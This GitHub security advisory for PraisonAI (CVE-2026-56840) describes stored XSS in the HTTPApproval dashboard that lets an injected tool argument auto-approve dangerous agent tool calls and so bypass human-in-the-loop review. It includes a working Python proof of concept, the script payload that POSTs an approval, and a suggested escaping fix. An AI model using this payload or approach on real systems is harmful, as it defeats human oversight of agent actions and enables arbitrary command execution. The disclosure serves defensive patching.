# [H] PraisonAI: HTTPApproval dashboard renders tool arguments as raw HTML, allowing approval-page XSS to approve dangerous tools

## Summary
Severity: High
Advisory: GHSA-63v4-w882-g4x2
CVE: CVE-2026-56840
CWE: CWE-79
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H (CVSS_V3)
Published: 2026-06-18
Source: https://github.com/advisories/GHSA-63v4-w882-g4x2
Type: github-advisory

## Affected
- PyPI: `praisonai` — affected >=4.5.2 <4.6.59

## Details
# HTTPApproval dashboard renders tool arguments as raw HTML, allowing approval-page XSS to approve dangerous tools

## Summary

`praisonai.bots.HTTPApproval` renders pending tool approval arguments directly
into the approval dashboard HTML. An attacker-controlled tool argument can
inject JavaScript into that page. When a human opens the approval URL to inspect
the risky tool request, the script runs in the dashboard origin and can POST to
the same request's `/approve/{request_id}/decide` endpoint, causing
`HTTPApproval` to return `approved=True`.

The local PoV uses a harmless `touch /tmp/prai010 #` command prefix and stops at
the approval decision. It does not execute the command.

## Affected Versions

Proposed affected range: `>= 4.5.2, <= 4.6.57`.

Validated affected:

- current head `2f9677abb2ea68eab864ee8b6a828fd0141612e1`
  (`v4.6.57-4-g2f9677ab`)
- `v4.5.2`
- `v4.5.3`
- `v4.5.124`
- `v4.5.126`
- `v4.5.128`
- `v4.6.10`
- `v4.6.56`
- `v4.6.57`

`v4.5.0` and `v4.5.1` do not contain the HTTPApproval backend.

## Impact

An attacker who can influence an agent task or prompt enough to produce a
dangerous tool call can embed a short XSS payload in the tool argument. When the
human approver opens the HTTP approval page, the script can approve the pending
dangerous tool call before the human explicitly clicks Approve or Deny.

This bypasses the human-in-the-loop approval boundary for dangerous tools such
as `execute_command`, `execute_code`, `delete_file`, or other tools gated
through `HTTPApproval`. If the agent continues after approval, the dangerous
tool runs with the privileges of the PraisonAI process.

## Why This Is Not Intended Behavior

PraisonAI documentation describes approval as a safety control that pauses an
agent before risky tools and asks a human or configured channel to allow or deny
execution. The documentation also lists `http` as a supported non-console
approval backend.

Opening the approval page to inspect a risky command should not itself approve
the command. The current behavior allows attacker-controlled tool arguments to
execute script in the approval page and submit the approval action.

This is distinct from the previously published stored-XSS advisory for agent
output rendering. That advisory concerned `src/praisonai/api.py` and missing
`nh3` sanitization in older versions. This report concerns the `HTTPApproval`
dashboard sink and remains present in current head.

## Root Cause

In `src/praisonai/praisonai/bots/_http_approval.py`, `_build_html()` builds the
approval page with raw f-string interpolation:

- argument keys and values are appended to `args_html` without HTML escaping;
- `tool_name`, `risk_level`, and `agent_name` are also interpolated into the
  returned HTML;
- the generated page contains same-origin JavaScript that posts to
  `/approve/{request_id}/decide`.

`_handle_decide()` accepts JSON from that endpoint and marks the pending request
approved when `decision == "approve"`.

Because the approval page is generated from the pending request's unescaped tool
arguments, an injected script can call the same endpoint that the legitimate
Approve button uses. The request id is unguessable, but the script runs inside
the loaded approval page and can derive the endpoint from `location.pathname`.

## Reproduction

The PoV is local-only and does not execute the dangerous tool command. Run it
from a PraisonAI checkout or environment where `praisonai` and
`praisonaiagents` import from the candidate version.

```python
import asyncio
import json
import socket

import aiohttp
from praisonai.bots._http_approval import HTTPApproval
from praisonaiagents.approval.protocols import ApprovalRequest


def free_port():
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
        sock.bind(("127.0.0.1", 0))
        return sock.getsockname()[1]


payload = (
    "touch /tmp/prai010 # "
    "</code><script>"
    "fetch(location.pathname+'/decide',{"
    "method:'POST',headers:{'Content-Type':'application/json'},"
    "body:'{\"decision\":\"approve\"}'})"
    "</script><code>"
)


async def main():
    backend = HTTPApproval(host="127.0.0.1", port=free_port(), timeout=5)
    request = ApprovalRequest(
        tool_name="execute_command",
        arguments={"command": payload},
        risk_level="critical",
        agent_name="pov-agent",
    )
    task = asyncio.create_task(backend.request_approval(request))

    request_id = ""
    for _ in range(100):
        if backend._pending:
            request_id = next(iter(backend._pending))
            break
        await asyncio.sleep(0.05)
    assert request_id

    url = f"http://127.0.0.1:{backend._port}/approve/{request_id}"
    async with aiohttp.ClientSession() as session:
        async with session.get(url) as response:
            page = await response.text()
        raw_script_present = "<script>fetch(location.pathname+'/decide'" in page
        script_not_html_escaped = "&lt;script" not in page
        payload_uses_same_origin_decide_endpoint = "fetch(location.pathname+'/decide'" in page
        payload_not_truncated = "..." not in page[
            page.find("<script>"):page.find("<script>") + len(payload) + 10
        ]
        assert raw_script_present
        assert script_not_html_escaped
        assert payload_not_truncated

        # Same request the injected same-origin script submits.
        async with session.post(f"{url}/decide", json={"decision": "approve"}) as response:
            post_body = await response.text()

    decision = await task
    await backend.shutdown()
    print(json.dumps({
        "payload_len": len(payload),
        "payload_shell_prefix": "touch /tmp/prai010",
        "raw_script_present": raw_script_present,
        "script_not_html_escaped": script_not_html_escaped,
        "payload_uses_same_origin_decide_endpoint": payload_uses_same_origin_decide_endpoint,
        "payload_not_truncated": payload_not_truncated,
        "post_body": post_body,
        "decision_approved": decision.approved,
        "decision_reason": decision.reason,
        "vulnerable": bool(
            raw_script_present
            and script_not_html_escaped
            and payload_uses_same_origin_decide_endpoint
            and payload_not_truncated
            and decision.approved
        ),
    }, indent=2))


asyncio.run(main())
```

Expected affected output includes:

```json
{
  "payload_len": 175,
  "payload_shell_prefix": "touch /tmp/prai010",
  "raw_script_present": true,
  "script_not_html_escaped": true,
  "payload_uses_same_origin_decide_endpoint": true,
  "payload_not_truncated": true,
  "decision_approved": true,
  "vulnerable": true
}
```

The relevant injected argument shape is:

```text
touch /tmp/prai010 # </code><script>fetch(location.pathname+'/decide',{method:'POST',headers:{'Content-Type':'application/json'},body:'{"decision":"approve"}'})</script><code>
```

The shell prefix demonstrates that the same argument can be executable shell
syntax after approval; the PoV stops before executing the tool.

## Suggested Fix

Escape every untrusted value before inserting it into the approval HTML:

- `tool_name`
- `risk_level`
- `agent_name`
- every argument key
- every argument value

For example, use `html.escape(str(value), quote=True)` or a template engine that
auto-escapes by default. Add regression tests that include `</code><script>...`
in tool arguments and assert that the rendered page contains escaped text, not a
script element.

Minimal patch shape:

```python
from html import escape


def h(value: object) -> str:
    return escape(str(value), quote=True)


tool_name = h(info.get("tool_name", "unknown"))
risk_level = h(info.get("risk_level", "unknown"))
agent_name = h(info.get("agent_name", ""))

args_html = ""
for k, v in arguments.items():
    val_str = str(v)
    if len(val_str) > 200:
        val_str = val_str[:197] + "..."
    args_html += (
        f"<tr><td><code>{h(k)}</code></td>"
        f"<td><code>{h(val_str)}</code></td></tr>"
    )
```

Additional hardening:

- avoid inline JavaScript and add a restrictive Content Security Policy;
- keep the request id as an unguessable capability, but do not rely on it as an
  XSS defense;
- consider requiring a per-request decision token outside attacker-controlled
  rendered argument fields.

## References
- https://github.com/MervinPraison/PraisonAI/security/advisories/GHSA-63v4-w882-g4x2
- https://github.com/MervinPraison/PraisonAI
